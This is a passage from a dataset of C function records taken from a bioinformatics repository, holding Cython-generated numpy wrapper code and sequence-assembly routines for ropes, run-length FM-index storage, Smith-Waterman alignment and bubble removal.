Py_None);\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":956\n *      cdef PyObject* baseptr\n *      if base is None:\n *          baseptr = NULL             # <<<<<<<<<<<<<<\n *      else:\n *          Py_INCREF(base) # important to do this before decref below!\n */\n    __pyx_v_baseptr = NULL;\n    goto __pyx_L3;\n  }\n  /*else*/ {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":958\n *          baseptr = NULL\n *      else:\n *          Py_INCREF(base) # important to do this before decref below!             # <<<<<<<<<<<<<<\n *          baseptr = <PyObject*>base\n *      Py_XDECREF(arr.base)\n */\n    Py_INCREF(__pyx_v_base);\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":959\n *      else:\n *          Py_INCREF(base) # important to do this before decref below!\n *          baseptr = <PyObject*>base             # <<<<<<<<<<<<<<\n *      Py_XDECREF(arr.base)\n *      arr.base = baseptr\n */\n    __pyx_v_baseptr = ((PyObject *)__pyx_v_base);\n  }\n  __pyx_L3:;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":960\n *          Py_INCREF(base) # important to do this before decref below!\n *          baseptr = <PyObject*>base\n *      Py_XDECREF(arr.base)             # <<<<<<<<<<<<<<\n *      arr.base = baseptr\n * \n */\n  Py_XDECREF(__pyx_v_arr->base);\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":961\n *          baseptr = <PyObject*>base\n *      Py_XDECREF(arr.base)\n *      arr.base = baseptr             # <<<<<<<<<<<<<<\n * \n * cdef inline object get_array_base(ndarray arr):\n */\n  __pyx_v_arr->base = __pyx_v_baseptr;\n\n  __Pyx_RefNannyFinishContext();\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/*proto*/\n", "func_signal": "static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j)", "code": "{\n    PyObject *r;\n    if (!j) return NULL;\n    r = PyObject_GetItem(o, j);\n    Py_DECREF(j);\n    return r;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/*****************\n * Save and load *\n *****************/\n", "func_signal": "int rld_dump(const rld_t *e, const char *fn)", "code": "{\n\tuint64_t k = 0;\n\tint i;\n\tuint32_t a;\n\tFILE *fp;\n\tfp = strcmp(fn, \"-\")? fopen(fn, \"wb\") : fdopen(fileno(stdout), \"wb\");\n\tif (fp == 0) return -1;\n\ta = e->asize<<16 | e->sbits;\n\tfwrite(\"RLD\\3\", 1, 4, fp); // write magic\n\tfwrite(&a, 4, 1, fp); // write sbits and asize\n\tfwrite(&k, 8, 1, fp); // preserve 8 bytes for future uses\n\tfwrite(&e->n_bytes, 8, 1, fp); // n_bytes can always be divided by 8\n\tfwrite(&e->n_frames, 8, 1, fp); // number of frames\n\tfwrite(e->mcnt + 1, 8, e->asize, fp); // write the marginal counts\n\tfor (i = 0, k = e->n_bytes / 8; i < e->n - 1; ++i, k -= RLD_LSIZE)\n\t\tfwrite(e->z[i], 8, RLD_LSIZE, fp);\n\tfwrite(e->z[i], 8, k, fp);\n\tfwrite(e->frame, 8 * e->asize1, e->n_frames, fp);\n\tfclose(fp);\n\treturn 0;\n}", "path": "nim-stuffs\\fermil-nim\\rld0.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/***************\n *** B+ rope ***\n ***************/\n", "func_signal": "rope_t *rope_init(int max_nodes, int block_len)", "code": "{\n\trope_t *rope;\n\trope = calloc(1, sizeof(rope_t));\n\tif (block_len < 32) block_len = 32;\n\trope->max_nodes = (max_nodes+ 1)>>1<<1;\n\trope->block_len = (block_len + 7) >> 3 << 3;\n\trope->node = mp_init(sizeof(rpnode_t) * rope->max_nodes);\n\trope->leaf = mp_init(rope->block_len);\n\trope->root = mp_alloc(rope->node);\n\trope->root->n = 1;\n\trope->root->is_bottom = 1;\n\trope->root->p = mp_alloc(rope->leaf);\n\treturn rope;\n}", "path": "nim-stuffs\\fermil-nim\\rope.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/* Python 3 has a print function */\n", "func_signal": "static int __Pyx_Print(PyObject* stream, PyObject *arg_tuple, int newline)", "code": "{\n    PyObject* kwargs = 0;\n    PyObject* result = 0;\n    PyObject* end_string;\n    if (unlikely(!__pyx_print)) {\n        __pyx_print = __Pyx_GetAttrString(__pyx_b, \"print\");\n        if (!__pyx_print)\n            return -1;\n    }\n    if (stream) {\n        kwargs = PyDict_New();\n        if (unlikely(!kwargs))\n            return -1;\n        if (unlikely(PyDict_SetItemString(kwargs, \"file\", stream) < 0))\n            goto bad;\n        if (!newline) {\n            end_string = PyUnicode_FromStringAndSize(\" \", 1);\n            if (unlikely(!end_string))\n                goto bad;\n            if (PyDict_SetItemString(kwargs, \"end\", end_string) < 0) {\n                Py_DECREF(end_string);\n                goto bad;\n            }\n            Py_DECREF(end_string);\n        }\n    } else if (!newline) {\n        if (unlikely(!__pyx_print_kwargs)) {\n            __pyx_print_kwargs = PyDict_New();\n            if (unlikely(!__pyx_print_kwargs))\n                return -1;\n            end_string = PyUnicode_FromStringAndSize(\" \", 1);\n            if (unlikely(!end_string))\n                return -1;\n            if (PyDict_SetItemString(__pyx_print_kwargs, \"end\", end_string) < 0) {\n                Py_DECREF(end_string);\n                return -1;\n            }\n            Py_DECREF(end_string);\n        }\n        kwargs = __pyx_print_kwargs;\n    }\n    result = PyObject_Call(__pyx_print, arg_tuple, kwargs);\n    if (unlikely(kwargs) && (kwargs != __pyx_print_kwargs))\n        Py_DECREF(kwargs);\n    if (!result)\n        return -1;\n    Py_DECREF(result);\n    return 0;\nbad:\n    if (kwargs != __pyx_print_kwargs)\n        Py_XDECREF(kwargs);\n    return -1;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/****************\n * Open bubbles *\n ****************/\n", "func_signal": "void mag_v_pop_open(mag_t *g, magv_t *p, int min_elen)", "code": "{\n\tint i, j, k, l, dir, max_l, l_qry;\n\tmagv_t *q, *t;\n\tku128_v *r, *s;\n\tuint8_t *seq;\n\tint8_t mat[16];\n\n\tif (p->len < 0 || p->len >= min_elen) return;\n\t//if (p->nei[0].n && p->nei[1].n) return; // FIXME: between this and the next line, which is better?\n\tif (p->nei[0].n + p->nei[1].n != 1) return;\n\tdir = p->nei[0].n? 0 : 1;\n\t// initialize the scoring system\n\tfor (i = k = 0; i < 4; ++i)\n\t\tfor (j = 0; j < 4; ++j)\n\t\t\tmat[k++] = i == j? 5 : -4;\n\t\n\ts = &p->nei[dir];\n\tfor (l = 0; l < s->n; ++l) { // if we use \"if (p->nei[0].n + p->nei[1].n != 1)\", s->n == 1\n\t\tuint64_t v;\n\t\tkswq_t *qry;\n\t\tif ((int64_t)s->a[l].x < 0) continue;\n\t\tv = mag_tid2idd(g->h, s->a[l].x);\n\t\tq = &g->v.a[v>>1];\n\t\tif (q == p || q->nei[v&1].n == 1) continue;\n\t\t// get the query ready\n\t\tmax_l = (p->len - s->a[l].y) * 2;\n\t\tseq = malloc(max_l + 1);\n\t\tif (dir == 0) { // forward strand\n\t\t\tfor (j = s->a[l].y, k = 0; j < p->len; ++j)\n\t\t\t\tseq[k++] = p->seq[j] - 1;\n\t\t} else { // reverse\n\t\t\tfor (j = p->len - s->a[l].y - 1, k = 0; j >= 0; --j)\n\t\t\t\tseq[k++] = 4 - p->seq[j];\n\t\t}\n\t\tl_qry = k;\n\t\tqry = ksw_qinit(2, l_qry, seq, 4, mat);\n\t\t//fprintf(stderr, \"===> %lld:%lld:%d[%d], %d, %ld <===\\n\", p->k[0], p->k[1], s->n, l, p->nsr, q->nei[v&1].n);\n\t\t//for (j = 0; j < k; ++j) fputc(\"ACGTN\"[(int)seq[j]], stderr); fputc('\\n', stderr);\n\n\t\tr = &q->nei[v&1];\n\t\tfor (i = 0; i < r->n; ++i) {\n\t\t\tuint64_t w;\n\t\t\tkswr_t aln;\n\t\t\tif (r->a[i].x == p->k[dir] || (int64_t)r->a[i].x < 0) continue;\n\t\t\tw = mag_tid2idd(g->h, r->a[i].x);\n\t\t\t// get the target sequence\n\t\t\tt = &g->v.a[w>>1];\n\t\t\tif (w&1) { // reverse strand\n\t\t\t\tfor (j = t->len - r->a[i].y - 1, k = 0; j >= 0 && k < max_l; --j)\n\t\t\t\t\tseq[k++] = 4 - t->seq[j];\n\t\t\t} else {\n\t\t\t\tfor (j = r->a[i].y, k = 0; j < t->len && k < max_l; ++j)\n\t\t\t\t\tseq[k++] = t->seq[j] - 1;\n\t\t\t}\n\t\t\taln = ksw_align(0, 0, k, seq, 4, mat, 5, 2, 0, &qry);\n\t\t\t//for (j = 0; j < k; ++j) fputc(\"ACGTN\"[(int)seq[j]], stderr); fprintf(stderr, \"\\t%d\\t%f\\n\", aln.score, (l_qry * 5. - aln.score) / (5. + 4.));\n\t\t\tif (aln.score >= l_qry * 5 / 2) {\n\t\t\t\tdouble r_diff, n_diff;\n\t\t\t\tn_diff = (l_qry * 5. - aln.score) / (5. + 4.); // 5: matching score; -4: mismatchig score\n\t\t\t\tr_diff = n_diff / l_qry;\n\t\t\t\tif (n_diff < MAX_N_DIFF || r_diff < MAX_R_DIFF) break;\n\t\t\t}\n\t\t}\n\n\t\tif (i != r->n) {\n\t\t\t// mark delete in p and delete in q\n\t\t\tedge_mark_del(s->a[l]);\n\t\t\tfor (i = 0; i < r->n; ++i)\n\t\t\t\tif (r->a[i].x == p->k[dir])\n\t\t\t\t\tedge_mark_del(r->a[i]);\n\t\t}\n\t\tfree(seq); free(qry);\n\t}\n\n\tfor (i = 0; i < s->n; ++i)\n\t\tif (!edge_is_del(s->a[i])) break;\n\tif (i == s->n) mag_v_del(g, p); // p is not connected to any other vertices\n}", "path": "nim-stuffs\\fermil-nim\\bubble.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/***********************************\n * Initialization and deallocation *\n ***********************************/\n", "func_signal": "rld_t *rld_init(int asize, int bbits)", "code": "{\n\trld_t *e;\n\te = xcalloc(1, sizeof(rld_t));\n\te->n = 1;\n\te->z = xmalloc(sizeof(void*));\n\te->z[0] = xcalloc(RLD_LSIZE, 8);\n\te->ssize = 1<<bbits;\n\te->cnt = xcalloc(asize + 1, 8);\n\te->mcnt = xcalloc(asize + 1, 8);\n\te->abits = ilog2(asize) + 1;\n\te->asize = asize;\n\te->sbits = bbits;\n\te->asize1 = asize + 1;\n\te->offset0[0] = (e->asize1*16+63)/64;\n\te->offset0[1] = (e->asize1*32+63)/64;\n\te->offset0[2] = e->asize1;\n\treturn e;\n}", "path": "nim-stuffs\\fermil-nim\\rld0.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/**\n * Initialize the query data structure\n *\n * @param size   Number of bytes used to store a score; valid valures are 1 or 2\n * @param qlen   Length of the query sequence\n * @param query  Query sequence\n * @param m      Size of the alphabet\n * @param mat    Scoring matrix in a one-dimension array\n *\n * @return       Query data structure\n */\n", "func_signal": "kswq_t *ksw_qinit(int size, int qlen, const uint8_t *query, int m, const int8_t *mat)", "code": "{\n\tkswq_t *q;\n\tint slen, a, tmp, p;\n\n\tsize = size > 1? 2 : 1;\n\tp = 8 * (3 - size); // # values per __m128i\n\tslen = (qlen + p - 1) / p; // segmented length\n\tq = (kswq_t*)malloc(sizeof(kswq_t) + 256 + 16 * slen * (m + 4)); // a single block of memory\n\tq->qp = (__m128i*)(((size_t)q + sizeof(kswq_t) + 15) >> 4 << 4); // align memory\n\tq->H0 = q->qp + slen * m;\n\tq->H1 = q->H0 + slen;\n\tq->E  = q->H1 + slen;\n\tq->Hmax = q->E + slen;\n\tq->slen = slen; q->qlen = qlen; q->size = size;\n\t// compute shift\n\ttmp = m * m;\n\tfor (a = 0, q->shift = 127, q->mdiff = 0; a < tmp; ++a) { // find the minimum and maximum score\n\t\tif (mat[a] < (int8_t)q->shift) q->shift = mat[a];\n\t\tif (mat[a] > (int8_t)q->mdiff) q->mdiff = mat[a];\n\t}\n\tq->max = q->mdiff;\n\tq->shift = 256 - q->shift; // NB: q->shift is uint8_t\n\tq->mdiff += q->shift; // this is the difference between the min and max scores\n\t// An example: p=8, qlen=19, slen=3 and segmentation:\n\t//  {{0,3,6,9,12,15,18,-1},{1,4,7,10,13,16,-1,-1},{2,5,8,11,14,17,-1,-1}}\n\tif (size == 1) {\n\t\tint8_t *t = (int8_t*)q->qp;\n\t\tfor (a = 0; a < m; ++a) {\n\t\t\tint i, k, nlen = slen * p;\n\t\t\tconst int8_t *ma = mat + a * m;\n\t\t\tfor (i = 0; i < slen; ++i)\n\t\t\t\tfor (k = i; k < nlen; k += slen) // p iterations\n\t\t\t\t\t*t++ = (k >= qlen? 0 : ma[query[k]]) + q->shift;\n\t\t}\n\t} else {\n\t\tint16_t *t = (int16_t*)q->qp;\n\t\tfor (a = 0; a < m; ++a) {\n\t\t\tint i, k, nlen = slen * p;\n\t\t\tconst int8_t *ma = mat + a * m;\n\t\t\tfor (i = 0; i < slen; ++i)\n\t\t\t\tfor (k = i; k < nlen; k += slen) // p iterations\n\t\t\t\t\t*t++ = (k >= qlen? 0 : ma[query[k]]);\n\t\t}\n\t}\n\treturn q;\n}", "path": "nim-stuffs\\fermil-nim\\ksw.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/*********************\n *** Rope iterator ***\n *********************/\n", "func_signal": "void rope_itr_first(const rope_t *rope, rpitr_t *i)", "code": "{\n\tmemset(i, 0, sizeof(rpitr_t));\n\ti->rope = rope;\n\tfor (i->pa[i->d] = rope->root; !i->pa[i->d]->is_bottom;) // descend to the leftmost leaf\n\t\t++i->d, i->pa[i->d] = i->pa[i->d - 1]->p;\n}", "path": "nim-stuffs\\fermil-nim\\rope.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/* Runtime support code */\n", "func_signal": "static void __Pyx_RaiseDoubleKeywordsError(\n    const char* func_name,\n    PyObject* kw_name)", "code": "{\n    PyErr_Format(PyExc_TypeError,\n        #if PY_MAJOR_VERSION >= 3\n        \"%s() got multiple values for keyword argument '%U'\", func_name, kw_name);\n        #else\n        \"%s() got multiple values for keyword argument '%s'\", func_name,\n        PyString_AS_STRING(kw_name));\n        #endif\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":765\n *     return PyArray_MultiIterNew(3, <void*>a, <void*>b, <void*> c)\n * \n * cdef inline object PyArray_MultiIterNew4(a, b, c, d):             # <<<<<<<<<<<<<<\n *     return PyArray_MultiIterNew(4, <void*>a, <void*>b, <void*>c, <void*> d)\n * \n */\n", "func_signal": "static CYTHON_INLINE PyObject *__pyx_f_5numpy_PyArray_MultiIterNew4(PyObject *__pyx_v_a, PyObject *__pyx_v_b, PyObject *__pyx_v_c, PyObject *__pyx_v_d)", "code": "{\n  PyObject *__pyx_r = NULL;\n  PyObject *__pyx_t_1 = NULL;\n  __Pyx_RefNannySetupContext(\"PyArray_MultiIterNew4\");\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":766\n * \n * cdef inline object PyArray_MultiIterNew4(a, b, c, d):\n *     return PyArray_MultiIterNew(4, <void*>a, <void*>b, <void*>c, <void*> d)             # <<<<<<<<<<<<<<\n * \n * cdef inline object PyArray_MultiIterNew5(a, b, c, d, e):\n */\n  __Pyx_XDECREF(__pyx_r);\n  __pyx_t_1 = PyArray_MultiIterNew(4, ((void *)__pyx_v_a), ((void *)__pyx_v_b), ((void *)__pyx_v_c), ((void *)__pyx_v_d)); if (unlikely(!__pyx_t_1)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 766; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_r = __pyx_t_1;\n  __pyx_t_1 = 0;\n  goto __pyx_L0;\n\n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_AddTraceback(\"numpy.PyArray_MultiIterNew4\");\n  __pyx_r = 0;\n  __pyx_L0:;\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/* Python 3 has a print function */\n", "func_signal": "static int __Pyx_PrintOne(PyObject* stream, PyObject *o)", "code": "{\n    int res;\n    PyObject* arg_tuple = PyTuple_New(1);\n    if (unlikely(!arg_tuple))\n        return -1;\n    Py_INCREF(o);\n    PyTuple_SET_ITEM(arg_tuple, 0, o);\n    res = __Pyx_Print(stream, arg_tuple, 1);\n    Py_DECREF(arg_tuple);\n    return res;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/************\n * Encoding *\n ************/\n", "func_signal": "static inline void enc_next_block(rld_t *e, rlditr_t *itr)", "code": "{\n\tint i, type;\n\tif (itr->stail + 2 - *itr->i == RLD_LSIZE) {\n\t\t++e->n;\n\t\te->z = realloc(e->z, e->n * sizeof(void*));\n\t\titr->i = e->z + e->n - 1;\n\t\titr->shead = *itr->i = xcalloc(RLD_LSIZE, 8);\n\t} else itr->shead += e->ssize;\n\tif (e->cnt[0] - e->mcnt[0] < 0x4000) {\n\t\tuint16_t *p = (uint16_t*)itr->shead;\n\t\tfor (i = 0; i <= e->asize; ++i) p[i] = e->cnt[i] - e->mcnt[i];\n\t\ttype = 0;\n\t} else if (e->cnt[0] - e->mcnt[0] < 0x40000000) {\n\t\tuint32_t *p = (uint32_t*)itr->shead;\n\t\tfor (i = 0; i <= e->asize; ++i) p[i] = e->cnt[i] - e->mcnt[i];\n\t\ttype = 1;\n\t} else {\n\t\tuint64_t *p = (uint64_t*)itr->shead;\n\t\tfor (i = 0; i <= e->asize; ++i) p[i] = e->cnt[i] - e->mcnt[i];\n\t\ttype = 2;\n\t}\n\t*itr->shead |= (uint64_t)type<<62;\n\titr->p = itr->shead + e->offset0[type];\n\titr->stail = rld_get_stail(e, itr);\n\titr->q = (uint8_t*)itr->p;\n\titr->r = 64;\n\tfor (i = 0; i <= e->asize; ++i) e->mcnt[i] = e->cnt[i];\n}", "path": "nim-stuffs\\fermil-nim\\rld0.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/*proto*/\n", "func_signal": "static CYTHON_UNUSED int __pyx_pf_5numpy_7ndarray_0__getbuffer__(PyObject *__pyx_v_self, Py_buffer *__pyx_v_info, int __pyx_v_flags)", "code": "{\n  int __pyx_v_copy_shape;\n  int __pyx_v_i;\n  int __pyx_v_ndim;\n  int __pyx_v_endian_detector;\n  int __pyx_v_little_endian;\n  int __pyx_v_t;\n  char *__pyx_v_f;\n  PyArray_Descr *__pyx_v_descr = 0;\n  int __pyx_v_offset;\n  int __pyx_v_hasfields;\n  int __pyx_r;\n  int __pyx_t_1;\n  int __pyx_t_2;\n  int __pyx_t_3;\n  PyObject *__pyx_t_4 = NULL;\n  int __pyx_t_5;\n  int __pyx_t_6;\n  int __pyx_t_7;\n  PyObject *__pyx_t_8 = NULL;\n  char *__pyx_t_9;\n  __Pyx_RefNannySetupContext(\"__getbuffer__\");\n  if (__pyx_v_info == NULL) return 0;\n  __pyx_v_info->obj = Py_None; __Pyx_INCREF(Py_None);\n  __Pyx_GIVEREF(__pyx_v_info->obj);\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":194\n *             # of flags\n *             cdef int copy_shape, i, ndim\n *             cdef int endian_detector = 1             # <<<<<<<<<<<<<<\n *             cdef bint little_endian = ((<char*>&endian_detector)[0] != 0)\n * \n */\n  __pyx_v_endian_detector = 1;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":195\n *             cdef int copy_shape, i, ndim\n *             cdef int endian_detector = 1\n *             cdef bint little_endian = ((<char*>&endian_detector)[0] != 0)             # <<<<<<<<<<<<<<\n * \n *             ndim = PyArray_NDIM(self)\n */\n  __pyx_v_little_endian = ((((char *)(&__pyx_v_endian_detector))[0]) != 0);\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":197\n *             cdef bint little_endian = ((<char*>&endian_detector)[0] != 0)\n * \n *             ndim = PyArray_NDIM(self)             # <<<<<<<<<<<<<<\n * \n *             if sizeof(npy_intp) != sizeof(Py_ssize_t):\n */\n  __pyx_v_ndim = PyArray_NDIM(((PyArrayObject *)__pyx_v_self));\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":199\n *             ndim = PyArray_NDIM(self)\n * \n *             if sizeof(npy_intp) != sizeof(Py_ssize_t):             # <<<<<<<<<<<<<<\n *                 copy_shape = 1\n *             else:\n */\n  __pyx_t_1 = ((sizeof(npy_intp)) != (sizeof(Py_ssize_t)));\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":200\n * \n *             if sizeof(npy_intp) != sizeof(Py_ssize_t):\n *                 copy_shape = 1             # <<<<<<<<<<<<<<\n *             else:\n *                 copy_shape = 0\n */\n    __pyx_v_copy_shape = 1;\n    goto __pyx_L5;\n  }\n  /*else*/ {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":202\n *                 copy_shape = 1\n *             else:\n *                 copy_shape = 0             # <<<<<<<<<<<<<<\n * \n *             if ((flags & pybuf.PyBUF_C_CONTIGUOUS == pybuf.PyBUF_C_CONTIGUOUS)\n */\n    __pyx_v_copy_shape = 0;\n  }\n  __pyx_L5:;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":204\n *                 copy_shape = 0\n * \n *             if ((flags & pybuf.PyBUF_C_CONTIGUOUS == pybuf.PyBUF_C_CONTIGUOUS)             # <<<<<<<<<<<<<<\n *                 and not PyArray_CHKFLAGS(self, NPY_C_CONTIGUOUS)):\n *                 raise ValueError(u\"ndarray is not C contiguous\")\n */\n  __pyx_t_1 = ((__pyx_v_flags & PyBUF_C_CONTIGUOUS) == PyBUF_C_CONTIGUOUS);\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":205\n * \n *             if ((flags & pybuf.PyBUF_C_CONTIGUOUS == pybuf.PyBUF_C_CONTIGUOUS)\n *                 and not PyArray_CHKFLAGS(self, NPY_C_CONTIGUOUS)):             # <<<<<<<<<<<<<<\n *                 raise ValueError(u\"ndarray is not C contiguous\")\n * \n */\n    __pyx_t_2 = (!PyArray_CHKFLAGS(((PyArrayObject *)__pyx_v_self), NPY_C_CONTIGUOUS));\n    __pyx_t_3 = __pyx_t_2;\n  } else {\n    __pyx_t_3 = __pyx_t_1;\n  }\n  if (__pyx_t_3) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":206\n *             if ((flags & pybuf.PyBUF_C_CONTIGUOUS == pybuf.PyBUF_C_CONTIGUOUS)\n *                 and not PyArray_CHKFLAGS(self, NPY_C_CONTIGUOUS)):\n *                 raise ValueError(u\"ndarray is not C contiguous\")             # <<<<<<<<<<<<<<\n * \n *             if ((flags & pybuf.PyBUF_F_CONTIGUOUS == pybuf.PyBUF_F_CONTIGUOUS)\n */\n    __pyx_t_4 = PyObject_Call(__pyx_builtin_ValueError, ((PyObject *)__pyx_k_tuple_9), NULL); if (unlikely(!__pyx_t_4)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 206; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_4);\n    __Pyx_Raise(__pyx_t_4, 0, 0);\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    {__pyx_filename = __pyx_f[1]; __pyx_lineno = 206; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    goto __pyx_L6;\n  }\n  __pyx_L6:;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":208\n *                 raise ValueError(u\"ndarray is not C contiguous\")\n * \n *             if ((flags & pybuf.PyBUF_F_CONTIGUOUS == pybuf.PyBUF_F_CONTIGUOUS)             # <<<<<<<<<<<<<<\n *                 and not PyArray_CHKFLAGS(self, NPY_F_CONTIGUOUS)):\n *                 raise ValueError(u\"ndarray is not Fortran contiguous\")\n */\n  __pyx_t_3 = ((__pyx_v_flags & PyBUF_F_CONTIGUOUS) == PyBUF_F_CONTIGUOUS);\n  if (__pyx_t_3) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":209\n * \n *             if ((flags & pybuf.PyBUF_F_CONTIGUOUS == pybuf.PyBUF_F_CONTIGUOUS)\n *                 and not PyArray_CHKFLAGS(self, NPY_F_CONTIGUOUS)):             # <<<<<<<<<<<<<<\n *                 raise ValueError(u\"ndarray is not Fortran contiguous\")\n * \n */\n    __pyx_t_1 = (!PyArray_CHKFLAGS(((PyArrayObject *)__pyx_v_self), NPY_F_CONTIGUOUS));\n    __pyx_t_2 = __pyx_t_1;\n  } else {\n    __pyx_t_2 = __pyx_t_3;\n  }\n  if (__pyx_t_2) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":210\n *             if ((flags & pybuf.PyBUF_F_CONTIGUOUS == pybuf.PyBUF_F_CONTIGUOUS)\n *                 and not PyArray_CHKFLAGS(self, NPY_F_CONTIGUOUS)):\n *                 raise ValueError(u\"ndarray is not Fortran contiguous\")             # <<<<<<<<<<<<<<\n * \n *             info.buf = PyArray_DATA(self)\n */\n    __pyx_t_4 = PyObject_Call(__pyx_builtin_ValueError, ((PyObject *)__pyx_k_tuple_11), NULL); if (unlikely(!__pyx_t_4)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 210; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_4);\n    __Pyx_Raise(__pyx_t_4, 0, 0);\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    {__pyx_filename = __pyx_f[1]; __pyx_lineno = 210; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    goto __pyx_L7;\n  }\n  __pyx_L7:;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":212\n *                 raise ValueError(u\"ndarray is not Fortran contiguous\")\n * \n *             info.buf = PyArray_DATA(self)             # <<<<<<<<<<<<<<\n *             info.ndim = ndim\n *             if copy_shape:\n */\n  __pyx_v_info->buf = PyArray_DATA(((PyArrayObject *)__pyx_v_self));\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":213\n * \n *             info.buf = PyArray_DATA(self)\n *             info.ndim = ndim             # <<<<<<<<<<<<<<\n *             if copy_shape:\n *                 # Allocate new buffer for strides and shape info. This is allocated\n */\n  __pyx_v_info->ndim = __pyx_v_ndim;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":214\n *             info.buf = PyArray_DATA(self)\n *             info.ndim = ndim\n *             if copy_shape:             # <<<<<<<<<<<<<<\n *                 # Allocate new buffer for strides and shape info. This is allocated\n *                 # as one block, strides first.\n */\n  if (__pyx_v_copy_shape) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":217\n *                 # Allocate new buffer for strides and shape info. This is allocated\n *                 # as one block, strides first.\n *                 info.strides = <Py_ssize_t*>stdlib.malloc(sizeof(Py_ssize_t) * ndim * 2)             # <<<<<<<<<<<<<<\n *                 info.shape = info.strides + ndim\n *                 for i in range(ndim):\n */\n    __pyx_v_info->strides = ((Py_ssize_t *)malloc((((sizeof(Py_ssize_t)) * __pyx_v_ndim) * 2)));\n\n    /* 